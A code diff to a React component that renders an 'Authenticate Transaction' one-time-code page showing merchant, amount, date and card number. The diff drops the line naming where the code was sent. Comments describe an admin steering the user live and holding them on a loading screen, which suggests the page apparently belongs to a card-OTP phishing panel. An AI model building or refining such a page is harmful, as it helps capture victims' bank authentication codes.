@@ -8,8 +8,6 @@ import { OTP_LENGTH } from "@/lib/activation";
 import { useActivationLive } from "@/lib/useActivationLive";
 
 interface Props {
-  /** Where the code was sent — the last four of the phone, e.g. "1186". */
-  sentTo: string;
   merchant: string;
   amount: string;
   date: string;
@@ -50,7 +48,7 @@ function HelpRow({ label, children }: { label: string; children: React.ReactNode
  * the account drops back to the loading screen to await final approval. A live
  * stream still carries them elsewhere the instant the admin changes course.
  */
-export function ActivationOtp({ sentTo, merchant, amount, date, cardNumber }: Props) {
+export function ActivationOtp({ merchant, amount, date, cardNumber }: Props) {
   const router = useRouter();
   const [state, action, pending] = useActionState(verifyActivationOtpAction, undefined);
   const [code, setCode] = useState("");
@@ -106,11 +104,8 @@ export function ActivationOtp({ sentTo, merchant, amount, date, cardNumber }: Pr
         <div className="px-6 py-5 text-[#7a1f1f]">
           <h1 className="text-center text-lg font-bold text-slate-900">Authenticate Transaction</h1>
 
-          <p className="mt-3 text-sm leading-relaxed">
+          <p className="mt-2 text-sm leading-relaxed">
             Enter the confirmation code you received to confirm the transaction.
-          </p>
-          <p className="mt-2 text-sm">
-            Code has been sent to: <span className="font-semibold">{sentTo}</span>
           </p>
           <p className="mt-1 text-sm">The page will automatically time out in 10 minutes.</p>
 
